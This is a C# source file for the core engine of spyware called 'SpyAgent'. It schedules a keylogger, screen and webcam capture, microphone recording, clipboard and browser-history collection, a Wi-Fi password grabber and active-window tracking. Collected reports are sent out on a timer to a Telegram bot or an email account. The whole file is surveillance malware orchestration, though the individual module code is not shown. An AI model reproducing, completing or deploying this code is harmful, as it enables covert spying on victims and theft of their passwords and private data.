namespace SpyAgent.Core;

using SpyAgent.Config;
using SpyAgent.Modules;
using SpyAgent.Reporting;

internal sealed class SpyEngine
{
    private readonly SpyConfig _config;
    private readonly ModuleScheduler _scheduler;
    private readonly DataAggregator _aggregator;
    private readonly CancellationTokenSource _cts = new();

    public SpyEngine(SpyConfig config)
    {
        _config = config;
        _aggregator = new DataAggregator();
        _scheduler = new ModuleScheduler(_aggregator);

        RegisterModules();
    }

    private void RegisterModules()
    {
        if (_config.Modules.Keylogger.Enabled)
            _scheduler.Register(new KeyLogger(), _config.Modules.Keylogger.Interval);

        if (_config.Modules.ScreenCapture.Enabled)
            _scheduler.Register(new ScreenCapture(), _config.Modules.ScreenCapture.Interval);

        if (_config.Modules.Webcam.Enabled)
            _scheduler.Register(new WebcamRecorder(), _config.Modules.Webcam.Interval);

        if (_config.Modules.Clipboard.Enabled)
            _scheduler.Register(new ClipboardWatcher(), _config.Modules.Clipboard.Interval);

        if (_config.Modules.BrowserHistory.Enabled)
            _scheduler.Register(new BrowserHistoryCollector(), _config.Modules.BrowserHistory.Interval);

        if (_config.Modules.Microphone.Enabled)
            _scheduler.Register(new MicrophoneRecorder(_config.Modules.Microphone.Duration), _config.Modules.Microphone.Duration + 10);

        if (_config.Modules.WifiPasswords.Enabled)
            _scheduler.Register(new WifiPasswordGrabber(), _config.Modules.WifiPasswords.Interval);

        if (_config.Modules.ActiveWindow.Enabled)
            _scheduler.Register(new ActiveWindowTracker(), _config.Modules.ActiveWindow.Interval);
    }

    public async Task RunAsync()
    {
        _scheduler.StartAll(_cts.Token);

        var reporter = CreateReporter();
        var reportInterval = TimeSpan.FromSeconds(_config.ReportInterval);

        while (!_cts.Token.IsCancellationRequested)
        {
            await Task.Delay(reportInterval, _cts.Token);

            var report = _aggregator.BuildReport();
            if (report.Length > 0)
                await reporter.SendReportAsync(report);
        }
    }

    private IReporter CreateReporter() => _config.ReportingMethod switch
    {
        "telegram" => new TelegramReporter(_config.TelegramBotToken, _config.TelegramChatId),
        "email" => new EmailReporter(_config.SmtpServer, _config.SmtpPort, _config.EmailFrom, _config.EmailTo, _config.EmailPassword),
        _ => new TelegramReporter(_config.TelegramBotToken, _config.TelegramChatId)
    };

    public void Stop() => _cts.Cancel();
}
